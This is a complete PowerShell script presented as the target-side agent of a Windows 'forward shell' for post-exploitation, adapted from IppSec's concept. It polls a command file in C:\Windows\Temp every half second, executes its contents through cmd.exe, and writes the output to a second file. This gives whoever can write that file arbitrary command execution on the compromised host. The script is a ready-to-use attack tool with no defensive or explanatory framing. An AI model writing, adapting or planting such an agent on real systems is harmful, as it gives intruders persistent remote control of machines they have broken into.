# agent.ps1
# Windows Forward Shell - Target-side PowerShell Agent
# Adapted from IppSec's Forward Shell concept for Windows
# Polling-based command execution with file I/O

$basePath = "C:\Windows\Temp"
$cmdFile  = Join-Path $basePath "fwd_cmd.txt"
$outFile  = Join-Path $basePath "fwd_out.txt"

# Initialize: clean stale files
if (Test-Path $cmdFile) { Remove-Item $cmdFile -Force -ErrorAction SilentlyContinue }
if (Test-Path $outFile) { Remove-Item $outFile -Force -ErrorAction SilentlyContinue }

# Create empty output file so controller can poll immediately
"" | Out-File -FilePath $outFile -Encoding utf8

# Main polling loop
while ($true) {
    Start-Sleep -Milliseconds 500

    if (Test-Path $cmdFile) {
        try {
            $cmd = Get-Content -Path $cmdFile -Raw -ErrorAction Stop
            if ([string]::IsNullOrWhiteSpace($cmd)) { continue }

            # Delete command file to mark as consumed
            Remove-Item -Path $cmdFile -Force -ErrorAction SilentlyContinue

            # Execute command, capture stdout + stderr
            $result = & cmd.exe /c $cmd 2>&1 | Out-String

            # Append result to output file
            $result | Out-File -FilePath $outFile -Append -Encoding utf8
        } catch {
            "ERROR: $_" | Out-File -FilePath $outFile -Append -Encoding utf8
        }
    }
}
